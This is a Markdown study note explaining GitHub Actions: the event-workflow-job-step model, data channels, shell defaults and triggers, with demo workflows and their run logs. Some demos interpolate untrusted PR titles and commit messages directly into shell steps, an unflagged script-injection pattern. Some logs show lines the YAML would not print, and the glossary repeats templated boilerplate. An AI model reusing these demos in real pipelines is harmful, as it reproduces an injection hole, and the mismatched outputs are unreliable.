---
title: "01 - GitHub Actions Fundamentals"
tags:
  - github-actions
  - ci-cd
---

# GitHub Actions Fundamentals

> [!quote]+
> "There should be two tasks for a human being to perform to deploy software into a development, test, or production environment: to pick the version and environment and to press the 'deploy' button."
>
> — **David Farley**, *Continuous Delivery* (2010)

> [!abstract]- Summary
>
> Explains the execution model, syntax surfaces, and security boundaries of GitHub Actions so you can read, author, and debug workflow YAML without confusing workflow-processing time, runner runtime, or deployment-time controls.
>
> **Execution model and workflow anatomy**
> - Defines events, workflows, jobs, steps, runners, expressions, contexts, and the event-to-workflow-to-job-to-step execution chain before breaking down the top-level workflow keys
> - Explains evaluation order, shell defaults, and how data moves across `GITHUB_OUTPUT`, `GITHUB_ENV`, static `env:`, artifacts, caches, and job summaries
>
> **Triggers, runners, and job orchestration**
> - Covers `push`, `pull_request`, `pull_request_target`, `schedule`, `workflow_dispatch`, `repository_dispatch`, `workflow_call`, `workflow_run`, `merge_group`, and `issue_comment` triggers plus the trust and routing differences between them
> - Compares GitHub-hosted, self-hosted, larger, and ephemeral runners; then layers in `needs`, matrix jobs, job outputs, containers, and service containers for multi-job orchestration
>
> **Expressions, variables, and workflow state**
> - Uses expressions, status functions, contexts, variables, step outputs, default environment variables, and environment-scoped settings to control job behavior and pass values safely
> - Distinguishes configuration variables from secrets and shows where Actions evaluates YAML expressions versus where shells evaluate runtime environment variables
>
> **Security, reuse, and observability**
> - Covers secret scoping, `GITHUB_TOKEN`, explicit `permissions:`, concurrency, environments, OIDC, action pinning, reusable workflows, composite actions, artifacts, caching, and debugging via `gh run`, workflow commands, annotations, and local testing with `act`
> - Extends the fundamentals to data-engineering patterns so the core model still holds when workflows start touching warehouses, cloud auth, and deployment gates
>
> **Operations and safety**
> - Warnings: `pull_request_target` trust issues, expression-versus-shell confusion, over-broad `GITHUB_TOKEN` permissions, stale caches, unsafe secret handling, and unpinned third-party actions
> - Recommendations: scope `permissions:` explicitly, prefer OIDC over long-lived cloud secrets, pin actions to SHAs, separate data channels deliberately, and choose runner type and trigger type based on trust boundaries
> - Troubleshooting: debugging and observability guidance for broken expressions, missing outputs, trigger surprises, runner drift, auth failures, and runtime inspection

> [!note]- Glossary
>
> **Workflow**
> - A YAML file in `.github/workflows/` that defines an automated process. One repo can have unlimited workflows.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Event**
> - A repository activity (push, PR, cron, manual dispatch) that triggers one or more workflows.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Trigger**
> - The `on:` key in a workflow that maps events to workflow runs.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Workflow run**
> - A single execution of a workflow, identified by a unique `run_id`.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Job**
> - A unit of work within a workflow. Each job runs on a separate runner VM. Jobs run in parallel by default.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Step**
> - A single task within a job. Steps run sequentially, sharing the runner's filesystem.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Action**
> - A reusable unit of code referenced with `uses:`. Can be JavaScript, Docker, or composite.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!info] Operational nuance
> >
> > Treat this as a concrete GitHub Actions object, runtime surface, or workflow control rather than as a loose synonym. The surrounding YAML behaves differently depending on this exact meaning.
>
> ---
>
> **Runner**
> - A server that executes jobs. Can be GitHub-hosted (ephemeral VM) or self-hosted (your infrastructure).
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Context**
> - A dictionary of data available in expressions (`github`, `runner`, `env`, `steps`, `needs`, `matrix`, `inputs`, `vars`, `secrets`).
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Expression**
> - A `${{ }}` template evaluated by GitHub at workflow-processing time, before any shell runs.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **GITHUB_TOKEN**
> - An auto-generated, scoped token that authenticates a workflow run to the GitHub API. Expires when the run ends.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Secret**
> - An encrypted variable stored at repo, environment, or org level. Masked in logs.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Configuration variable**
> - A plaintext variable (`vars` context) for non-sensitive config. Not masked.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Environment**
> - A named deployment target (e.g., `staging`, `production`) with optional protection rules and scoped secrets.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Artifact**
> - A file or directory uploaded from a workflow run, downloadable by other jobs or users. Default retention: 90 days.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Cache**
> - A stored dependency tree (e.g., pip, npm) keyed by a hash of a lockfile. Evicted after 7 days of no access. Max 10 GB per repo.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Concurrency group**
> - A named lock that serializes or cancels overlapping runs.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Permissions**
> - The `permissions:` key that scopes the `GITHUB_TOKEN` to specific API capabilities.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **OIDC**
> - OpenID Connect — a protocol for exchanging short-lived GitHub JWTs for cloud provider credentials without storing long-lived secrets.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Reusable workflow**
> - A workflow that accepts `workflow_call` and can be invoked by other workflows via `uses:`.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Composite action**
> - An action defined in `action.yml` that groups multiple steps into a single `uses:` reference.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Matrix strategy**
> - A build matrix that generates multiple job instances from combinations of values.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Service container**
> - A Docker container (e.g., PostgreSQL) attached to a job for integration testing.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Workflow command**
> - A `::command::` string written to stdout that instructs the runner to set outputs, mask values, create annotations, or group log lines.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Job summary**
> - Markdown written to `$GITHUB_STEP_SUMMARY` that renders on the workflow run page in GitHub.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **GITHUB_OUTPUT**
> - A file that steps write to for setting step outputs (replacing the deprecated `::set-output` command).
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **GITHUB_ENV**
> - A file that steps write to for dynamically setting environment variables available to subsequent steps in the same job.
> - It matters in this note because the workflows for workflow structure, trigger semantics, runner behavior, expression evaluation, and GitHub Actions security boundaries read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.


## Conceptual Model

GitHub Actions executes automated processes in response to repository events. The execution flows through four levels: **event → workflow → job → step**.

```mermaid
%%{init: {'theme': 'dark', 'themeVariables': {
  'primaryColor': '#292e42',
  'primaryTextColor': '#c0caf5',
  'primaryBorderColor': '#565f89',
  'lineColor': '#565f89',
  'secondaryColor': '#1a1b26',
  'tertiaryColor': '#24283b',
  'noteTextColor': '#c0caf5',
  'noteBkgColor': '#292e42',
  'textColor': '#c0caf5',
  'fontSize': '14px'
}}}%%
flowchart TB
    subgraph Event["Repository Event"]
        E1["push to main"]
        E2["pull_request opened"]
        E3["schedule (cron)"]
        E4["workflow_dispatch (manual)"]
    end

    subgraph Workflow["Workflow (.github/workflows/*.yml)"]
        direction LR
        ON["on: trigger filter"]
        PERM["permissions: GITHUB_TOKEN scope"]
        ENV["env: workflow-level variables"]
        CONC["concurrency: group + cancel"]
    end

    subgraph Jobs["Jobs (parallel by default)"]
        direction LR
        J1["Job A: lint<br/>runs-on: ubuntu-latest"]
        J2["Job B: test<br/>needs: lint"]
        J3["Job C: deploy<br/>environment: production"]
    end

    subgraph Steps["Steps (sequential in a job)"]
        direction TB
        S1["uses: actions/checkout@v4"]
        S2["run: ruff check ."]
        S3["run: echo val >> GITHUB_OUTPUT"]
    end

    E1 & E2 & E3 & E4 --> ON
    ON --> PERM --> ENV --> CONC
    CONC --> J1 & J2 & J3
    J2 --> Steps

    style Event fill:#1a1b26,stroke:#565f89,color:#c0caf5
    style Workflow fill:#292e42,stroke:#565f89,color:#c0caf5
    style Jobs fill:#24283b,stroke:#565f89,color:#c0caf5
    style Steps fill:#292e42,stroke:#565f89,color:#c0caf5
```

*The execution model: a repository event matches a workflow's `on:` trigger, which spawns a workflow run. The run creates jobs, each on its own runner VM. Steps within a job execute sequentially, sharing the runner's filesystem and environment. Jobs run in parallel by default unless ordered with `needs:`.*

### GitHub Actions | conceptual model | data flow

Data moves between steps, jobs, and workflows through specific channels:

| Channel | Scope | Set by | Read by | Crosses job boundary? |
|---------|-------|--------|---------|----------------------|
| `GITHUB_OUTPUT` | Step → step/job | `echo "key=val" >> $GITHUB_OUTPUT` | `${{ steps.<id>.outputs.key }}` or `${{ needs.<job>.outputs.key }}` | Yes (via `jobs.<id>.outputs`) |
| `GITHUB_ENV` | Step → subsequent steps | `echo "KEY=val" >> $GITHUB_ENV` | `$KEY` or `${{ env.KEY }}` | No |
| `env:` (static) | Workflow/job/step | YAML `env:` block | `$KEY` or `${{ env.KEY }}` | No |
| `vars` | Repo/environment | GitHub Settings UI | `${{ vars.KEY }}` | Yes |
| `secrets` | Repo/environment/org | GitHub Settings UI | `${{ secrets.KEY }}` | Yes |
| Artifacts | Job → job/workflow | `actions/upload-artifact` | `actions/download-artifact` | Yes |
| Cache | Job → future runs | `actions/cache` | `actions/cache` (restore) | Yes (across runs) |
| `GITHUB_STEP_SUMMARY` | Step → run page | `echo "md" >> $GITHUB_STEP_SUMMARY` | GitHub UI run summary | N/A (display only) |

### GitHub Actions | conceptual model | evaluation order

Expressions (`${{ }}`) are evaluated by GitHub **at workflow-processing time**, before any shell command runs. This distinction is critical:

1. **Workflow parse** — GitHub reads the YAML and evaluates all `${{ }}` expressions.
2. **Job creation** — GitHub creates runner VMs and assigns jobs.
3. **Step execution** — The runner executes shell commands with the already-substituted values.

This means `${{ github.sha }}` is a string literal by the time bash sees it — it is not a shell variable. Conversely, `$GITHUB_SHA` is a real environment variable available at shell runtime.

> [!warning] Expression evaluation is not shell evaluation
>
> `${{ }}` expressions are resolved before the shell starts. You cannot use shell logic to construct expression values. `if: ${{ env.MY_VAR == 'true' }}` reads `env.MY_VAR` from the context object, not from the shell environment. If `MY_VAR` was set via `GITHUB_ENV` in a previous step, the `env` context will have it — but if set via `export` in the same step, it will not.

> [!success] Use the right channel for the right scope
>
> - Need a value in the next step of the same job? → `GITHUB_ENV`
> - Need a value in a different job? → `GITHUB_OUTPUT` + `jobs.<id>.outputs`
> - Need a value across workflow runs? → Artifacts or cache
> - Need a value from GitHub Settings? → `vars` (plaintext) or `secrets` (encrypted)

## Workflow File Anatomy

Every workflow lives at `.github/workflows/<name>.yml`. GitHub discovers all YAML files in that directory automatically — no registration step is needed.

### GitHub Actions | workflow | top-level keys

| Key | Required | Purpose |
|-----|----------|---------|
| `name` | No | Display name shown in the GitHub UI and `gh run list` output |
| `run-name` | No | Dynamic run name — can include expressions like `Deploy ${{ inputs.environment }}` |
| `on` | Yes | Event triggers — which repository events activate the workflow |
| `env` | No | Workflow-level environment variables, available to all jobs and steps |
| `permissions` | No | Explicit `GITHUB_TOKEN` scope — always declare for least privilege |
| `concurrency` | No | Prevent duplicate runs on the same branch or environment |
| `defaults` | No | Default `run` shell and `working-directory` for all steps |
| `jobs` | Yes | Map of jobs to execute — each job runs on its own runner |

### GitHub Actions | workflow | defaults and shell selection

Set `defaults.run` at workflow scope when most steps share the same shell or working directory. It becomes relevant in any workflow where you want predictable shell behavior without repeating `shell:` and `working-directory:` on every step. The setting applies to `run:` steps only and can still be overridden locally when a step needs different execution semantics.
> [!info]- Workflow YAML breakdown
>
> - `defaults.run.shell`: sets the default shell for all `run:` steps. Common values: `bash`, `pwsh`, `python3 {0}`, `sh`
> - `defaults.run.working-directory`: sets the default working directory, relative to the repo root
> - Individual steps can override both with their own `shell:` and `working-directory:` keys
> - `defaults.run` does NOT apply to `uses:` steps (actions)

*Set bash as the default shell with a custom working directory.*

```yaml
name: "Demo: Defaults and Shell"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-defaults-shell.yml"
  workflow_dispatch:

permissions:
  contents: read

defaults:
  run:
    shell: bash
    working-directory: ./src

jobs:
  shell-demo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Default shell and working dir
        run: |
          echo "=== defaults.run demo ==="
          echo "Shell: bash (set via defaults.run.shell)"
          echo "Working directory: $(pwd)"

      - name: Override shell for one step
        shell: python3 {0}
        working-directory: .
        run: |
          import sys
          print(f"=== Shell override ===")
          print(f"Python version: {sys.version}")
          print(f"Individual steps can override defaults.run")
```

*Workflow run output (run #1, triggered by push to main):*

```text
=== defaults.run demo ===
Shell: bash (set via defaults.run.shell)
Working directory: /home/runner/work/git-lab/git-lab/src
=== Shell override ===
Python version: 3.12.13 (main, Apr  8 2026, 12:35:41) [GCC 13.3.0]
Individual steps can override defaults.run
```

| Shell | Platform | Invocation | Error behavior |
|-------|----------|------------|----------------|
| `bash` | Linux, macOS | `bash --noprofile --norc -eo pipefail {0}` | Exits on first error; pipe fails if any command fails |
| `sh` | Linux, macOS | `sh -e {0}` | Exits on first error |
| `pwsh` | All | `pwsh -command ". '{0}'"` | PowerShell Core — `$ErrorActionPreference = 'stop'` |
| `python` | All | `python {0}` | Runs the script as Python |
| `cmd` | Windows | `cmd /D /E:ON /V:OFF /S /C "CALL "{0}""` | Windows Command Prompt |
| `powershell` | Windows | `powershell -command ". '{0}'"` | Windows PowerShell (5.x) |

## Triggers

The `on:` key defines which repository events activate the workflow. Each trigger type can be filtered by branch, path, tag, or activity type. Multiple triggers can be combined — the workflow runs when any of them fires.

### GitHub Actions | triggers | push event

Use this pattern when continuous integration — validate code quality and tests on every push.
**Trust boundary:** Runs code from the pushed commit. Secrets are available.

> [!info]- Workflow YAML breakdown
>
> - `on.push.branches`: glob-pattern list of branches that trigger the workflow. `[main, 'feature/**']` matches `main` and any branch under `feature/`
> - `on.push.paths`: only triggers if at least one changed file matches these glob patterns. Use to avoid running expensive CI on unrelated changes
> - `on.push.paths-ignore`: inverse of `paths` — trigger unless the only changes are in these paths. Cannot combine `paths` and `paths-ignore` in the same trigger
> - `on.push.tags`: trigger on tag creation. Use glob patterns like `v*` to match semantic version tags

*Show trigger context on push to main.*

```yaml
name: "Demo: Push Trigger"
on:
  push:
    branches: [main]
    paths:
      - "src/**"
      - "tests/**"
      - "*.py"
      - ".github/workflows/demo-push-trigger.yml"

permissions:
  contents: read

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Show trigger info
        run: |
          echo "Event: ${{ github.event_name }}"
          echo "Ref: ${{ github.ref }}"
          echo "SHA: ${{ github.sha }}"
          echo "Actor: ${{ github.actor }}"
          echo "Pusher: ${{ github.event.pusher.name }}"
          echo "Commit message: ${{ github.event.head_commit.message }}"
```

*Workflow run output (run #1, triggered by push to main):*

```text
Event: push
Ref: refs/heads/main
SHA: 739cdaf09d0d5a4ed7cfd46827a602fca7311af5
Actor: alp78
Pusher: alp78
Commit message: Add GitHub Actions demo workflows for Elysium vault chapter 10
```

| Filter | Syntax | Description |
|--------|--------|-------------|
| `branches` | `[main, 'release/**']` | Trigger only for pushes to matching branches |
| `branches-ignore` | `['dependabot/**']` | Trigger for all branches except these |
| `tags` | `['v*']` | Trigger on tag creation matching the pattern |
| `tags-ignore` | `['v*-rc*']` | Trigger on all tags except these |
| `paths` | `['src/**', '*.py']` | Trigger only if changed files match |
| `paths-ignore` | `['docs/**', '*.md']` | Trigger unless only these files changed |

### GitHub Actions | triggers | pull_request event

Use this pattern when CI validation on pull requests — lint, test, and check before merge.
**Trust boundary:** For PRs from the same repo, runs against a **temporary merge commit** (the PR head merged into the base). Secrets are available. For fork PRs, secrets are NOT available.

> [!info]- Workflow YAML breakdown
>
> - `on.pull_request.branches`: only triggers for PRs targeting these base branches
> - `on.pull_request.types`: activity types that trigger the workflow. Default: `[opened, synchronize, reopened]`. Other useful types: `ready_for_review`, `labeled`, `closed`
> - `github.sha` in a PR workflow is the merge commit SHA, not the head commit. Use `github.event.pull_request.head.sha` for the actual PR head

*Show PR context information.*

```yaml
name: "Demo: Pull Request Trigger"
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: read

jobs:
  pr-info:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Show PR context
        run: |
          echo "Event: ${{ github.event_name }}"
          echo "Action type: ${{ github.event.action }}"
          echo "PR number: ${{ github.event.pull_request.number }}"
          echo "PR title: ${{ github.event.pull_request.title }}"
          echo "Head ref: ${{ github.head_ref }}"
          echo "Base ref: ${{ github.base_ref }}"
          echo "Head SHA: ${{ github.event.pull_request.head.sha }}"
          echo "Is fork: ${{ github.event.pull_request.head.repo.fork }}"
          echo "Merge commit SHA: ${{ github.sha }}"
```

*Workflow run output (run #1, triggered by PR #10 from feature/demo-pr):*

```text
Event: pull_request
Action type: opened
PR number: 10
PR title: Demo: PR trigger test
Head ref: feature/demo-pr
Base ref: main
Head SHA: 44f3e42645f0837ad163e272eb4c56114d9bd3ed
Is fork: false
Merge commit SHA: 2fafdaabe31e624c604c6e6cab02ca9153c9d15d

IMPORTANT: This workflow runs against the MERGE commit
(a temporary ref that merges head into base).
Secrets are available ONLY for PRs from the same repo, not forks.
```

### GitHub Actions | triggers | pull_request_target event

Use this pattern when processing fork PRs that need write access or secrets — labels, comments, deployments.
**Trust boundary:** Runs workflow code from the **base branch** (not the PR head), with full secrets and write permissions.

> [!danger] pull_request_target runs untrusted code with full privileges
>
> If you check out the PR head (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`) and then run code from it (tests, scripts, build commands), you are executing arbitrary code from an untrusted fork with full access to secrets and write permissions. This is a known attack vector.

> [!success] Safe pattern for pull_request_target
>
> Use `pull_request_target` only for metadata operations (labeling, commenting). If you must build the PR code, use a two-workflow pattern:
> 1. A `pull_request` workflow that builds and tests (no secrets needed).
> 2. A `workflow_run` workflow triggered by the completion of #1, which runs on the base branch with secrets.

### GitHub Actions | triggers | schedule

Use this pattern when recurring tasks — nightly builds, weekly reports, periodic cleanup, SLA monitoring.
**Trust boundary:** Always runs on the **default branch** (main). Full secrets available.

> [!info]- Workflow YAML breakdown
>
> - `on.schedule[].cron`: standard five-field cron expression (minute hour day-of-month month day-of-week). Uses UTC timezone
> - Multiple cron expressions can be listed — each fires independently
> - `github.event.schedule` contains the cron expression that triggered the current run
> - Adding `workflow_dispatch` alongside `schedule` allows manual triggering for testing

*Run a scheduled check every hour at minute 45.*

```yaml
name: "Demo: Schedule Trigger"
on:
  schedule:
    - cron: "45 * * * *"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  scheduled-check:
    runs-on: ubuntu-latest
    steps:
      - name: Show schedule info
        run: |
          echo "Event: ${{ github.event_name }}"
          echo "Triggered at: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
          echo "Schedule expression: ${{ github.event.schedule }}"
```

*Workflow run output (run #2, triggered by cron schedule — fired 21 minutes after the :45 mark due to GitHub jitter):*

```text
Event: schedule
Triggered at: 2026-04-12 18:06:05 UTC

Schedule notes:
- Cron runs on the default branch only (main)
- GitHub does NOT guarantee exact timing
- Expect up to 15+ minutes of jitter under load
- Scheduled runs may be skipped entirely if the repo is inactive for 60+ days
- The github.event.schedule field shows which cron expression fired
Schedule expression: 45 * * * *
```

> [!warning] Cron timing is not deterministic
>
> GitHub does not guarantee exact cron execution times. Under high load, scheduled runs may be delayed by 15+ minutes. If the repo is inactive for 60+ days, scheduled workflows are automatically disabled. Do not rely on cron for time-sensitive operations — use an external scheduler (e.g., Cloud Scheduler) triggering `repository_dispatch` if you need precise timing.

> [!success] Monitoring cron reliability
>
> Add a `workflow_dispatch` trigger to every scheduled workflow. This lets you test the workflow manually and verify it works before waiting for the next cron window.

### GitHub Actions | triggers | workflow_dispatch

Use this pattern when manual triggers — ad-hoc deploys, backfills, on-demand reports, debugging.
**Trust boundary:** Runs on the branch selected in the UI or API call. Full secrets available.

> [!info]- Workflow YAML breakdown
>
> - `on.workflow_dispatch.inputs`: defines typed input parameters shown in the GitHub UI
> - Input types: `string`, `boolean`, `choice`, `environment` (dropdown of repo environments)
> - Access inputs in steps via `${{ inputs.<name> }}`
> - Trigger from CLI: `gh workflow run <name> -f key=value`

*Manual trigger with typed inputs.*

```yaml
name: "Demo: Workflow Dispatch"
on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Target environment"
        required: true
        type: choice
        options:
          - staging
          - production
        default: staging
      dry_run:
        description: "Run in dry-run mode (no side effects)"
        required: false
        type: boolean
        default: true
      log_level:
        description: "Logging verbosity"
        required: false
        type: choice
        options:
          - info
          - debug
          - warning
        default: info
      custom_message:
        description: "Optional message to include in the run"
        required: false
        type: string

permissions:
  contents: read

jobs:
  dispatch-demo:
    runs-on: ubuntu-latest
    steps:
      - name: Show dispatch inputs
        run: |
          echo "Event: ${{ github.event_name }}"
          echo "Actor: ${{ github.actor }}"
          echo ""
          echo "=== Inputs ==="
          echo "Environment: ${{ inputs.environment }}"
          echo "Dry run: ${{ inputs.dry_run }}"
          echo "Log level: ${{ inputs.log_level }}"
          echo "Custom message: ${{ inputs.custom_message }}"
```

*Trigger the workflow from the CLI with inputs.*

```bash
gh workflow run "Demo: Workflow Dispatch" -R alp78/git-lab \
  -f environment=staging \
  -f dry_run=true \
  -f log_level=debug \
  -f custom_message="Hello from workflow_dispatch"
```

*Workflow run output (run #1, triggered by workflow_dispatch):*

```text
Event: workflow_dispatch
Actor: alp78

=== Inputs ===
Environment: staging
Dry run: true
Log level: debug
Custom message: Hello from workflow_dispatch

DRY RUN MODE — no changes will be made
```

### GitHub Actions | triggers | repository_dispatch

Use this pattern when external system integration — triggering workflows from webhooks, APIs, other repos, or CI/CD orchestrators.
**Trust boundary:** Always runs on the **default branch** (main). Full secrets available.
